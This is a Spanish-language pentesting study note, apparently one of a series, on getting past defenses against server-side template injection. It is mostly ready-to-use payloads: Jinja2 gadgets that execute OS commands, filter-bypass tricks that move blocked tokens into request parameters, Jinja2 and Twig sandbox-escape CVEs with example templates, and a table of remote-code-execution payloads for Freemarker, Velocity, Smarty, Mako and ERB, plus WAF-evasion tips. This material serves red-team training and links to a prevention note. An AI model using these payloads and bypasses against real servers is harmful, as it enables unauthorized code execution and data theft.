---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Server-Side/SSTI
Descripción: "Los payloads 'de libro' (self.__init__.__globals__...) son verbosos y están llenos de guiones bajos y keywords que cualquier filtro bloquea"
Fecha de actualización: 2026-06-22
Nota previa: "[[03 - Explotación de SSTI - Twig]]"
Nota siguiente: "[[05 - Prevención de SSTI]]"
Area: "[[SSTI.base|SSTI]]"
---
---

Los payloads "de libro" ([[02 - Explotación de SSTI - Jinja2|`self.__init__.__globals__...`]]) son verbosos y están **llenos de guiones bajos y keywords** que cualquier filtro bloquea. En producción te encuentras dos defensas: **filtros de caracteres/keywords** (vetan `_`, `.`, comillas, `class`, `globals`…) y **sandboxes del motor** (Jinja2 `SandboxedEnvironment`, Twig `SandboxPolicy`). Esta nota las sortea.

# Jinja2: gadgets más limpios

En lugar de la cadena larga, los objetos globales del entorno Flask/Jinja alcanzan `os` con mucho menos ruido:

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<mark style="background: #ADCCFFA6;">`cycler`, `lipsum`, `joiner` y `namespace` son globales de Jinja accesibles directamente</mark>, y `request` existe en cualquier app Flask — todos llevan a `__globals__` sin pasar por `self.__init__`.

> [!important]+ Esto NO es escape de sandbox
> Estos gadgets (y los bypasses de filtros de abajo) aplican a entornos **sin** `SandboxedEnvironment`, donde lo que estorba es un filtro de caracteres/WAF. El `SandboxedEnvironment` **bloquea por diseño** el acceso a dunders (`__init__`, `__globals__`), así que aquí no funcionan: contra el sandbox hay que usar los **CVE de escape** (más abajo).

# Bypass de filtros de caracteres y keywords

La técnica madre: <mark style="background: #FF5582A6;">no escribir el string prohibido en el payload, sino **traerlo de `request`**</mark> (args, cookies, values) en tiempo de ejecución. Así nada vetado aparece literal.

- **Sin guion bajo `_`** ni keywords: pasar el atributo por parámetro con el filtro `|attr`:

```jinja2
{{ ()|attr(request.args.cls)|attr(request.args.glob) }}
```
con `?cls=__class__&glob=__globals__`. Los `__class__`/`__globals__` viajan en la query, no en la plantilla.

- **Sin punto `.`**: usar notación `[]` y `|attr`:

```jinja2
{{ request["application"]["__globals__"]["os"]["popen"]("id")["read"]() }}
```

- **Sin comillas**: construir los strings desde `request` o concatenando con `~`; o sacar caracteres con `request.args`.
- **Keyword filtrada** (`class`, `mro`, `globals`): partirla y concatenar — `request.args` o `"__cl"~"ass__"` — para que el WAF no la vea entera.

> [!important]+ El patrón general
> Cuando un filtro veta caracteres/palabras, <mark style="background: #8000E1A6;">mueve esos tokens a un canal que el filtro no inspecciona</mark> (`request.args`, `request.cookies`) y reconstrúyelos en runtime con `|attr` y `[]`. Es la idea que rompe casi cualquier blacklist de SSTI en Jinja2.

# Escapar del `SandboxedEnvironment` de Jinja2

El `SandboxedEnvironment` bloquea el acceso a atributos "inseguros" (los que empiezan por `_`). Pero **se ha escapado repetidamente** a través del método `str.format`, que la sandbox no interceptaba bien:

- **`CVE-2024-56326`** (Jinja2 < 3.1.5): guardar una referencia a `str.format` y pasarla a un filtro elude la intercepción de la sandbox. **Requiere** que la app tenga un *filtro custom* que invoque el callable recibido —ningún filtro built-in lo dispara—.
- **`CVE-2025-27516`** (Jinja2 < 3.1.6): `{{ ''|attr('format') }}` obtiene la referencia al método `format` saltándose la validación de atributos del entorno.

<mark style="background: #FFB86CA6;">Comprueba siempre la versión</mark> —`{{ lipsum.__globals__["jinja2"].__version__ }}`—: por debajo de **3.1.6**, el sandbox es explotable con payloads relativamente simples. Trátalo como barrera dura pero **no infranqueable**.

# Twig: bypass del sandbox

La `SandboxPolicy` de Twig limita tags/filtros/funciones permitidos. Vías de evasión:

- **Filtros permitidos con callback**: `filter`, `map`, `reduce` aceptan una función PHP → `{{ ['id']|map('system') }}` ejecuta aunque `system` no esté en la whitelist. Funciona con el sandbox **no** global; bajo `SandboxPolicy` global, `filter`/`map`/`reduce` ya exigen un `Closure` (no un string-callback), **con independencia de `CVE-2022-23614`** — ese CVE parcheó el filtro `sort`, que era la excepción que no lo validaba (*"disallow non-closures in the `sort` filter when the sandbox is enabled"*).
- **`_self.env`** (Twig **1.x**): `{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}`.
- **CVEs de escape del sandbox**: `CVE-2024-45411` (incluir una plantilla precargada fuera del contexto sandbox → **RCE**); `CVE-2026-46635` (el filtro `column` lee propiedades fuera de la allowlist → **fuga de datos**; GitHub la valora *Low*, aunque el CVSS 3.1 de NVD la sube a *Medium*; no RCE; fix en Twig **3.26.0**); y su follow-up `CVE-2026-48808` (bypass residual del parche anterior, solo bajo sandboxing vía `SourcePolicyInterface`; CVSS 3.1 = 7.5 *High*; fix en Twig **3.27.0**). El sandbox de Twig, como el de Jinja2, ha caído varias veces — comprueba la versión.

# Otros motores (referencia rápida)

| Motor | Lenguaje | Payload RCE típico |
| - | - | - |
| Freemarker | Java | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | Java | reflexión Java: `#set($e="e")$e.getClass().forName("java.lang.Runtime")...` — cadena completa en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#velocity) |
| Smarty | PHP | `{system('id')}` / `{php}...{/php}` (según versión) |
| Mako | Python | `${self.module.cache.util.os.system("id")}` |
| ERB | Ruby | `<%= \`id\` %>` |

# Evasión de WAF

Ofuscar el payload SSTI: espacios/saltos, **comentarios de plantilla** (`{# #}` en Jinja), concatenación de strings (`~`), y encoding según el contexto. La lógica es la de cualquier [[09 - Evasión de WAF y restricciones del servidor|evasión de WAF]].

> [!info]+ Fuentes
> - [PayloadsAllTheThings — SSTI (bypass)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) · [HackTricks — Jinja2 bypass](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
> - [Hackmanit — Template injection table](https://github.com/Hackmanit/template-injection-table) · [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)

Vista la evasión, el reverso defensivo —cómo se cierra de verdad una SSTI— es la [[05 - Prevención de SSTI]].
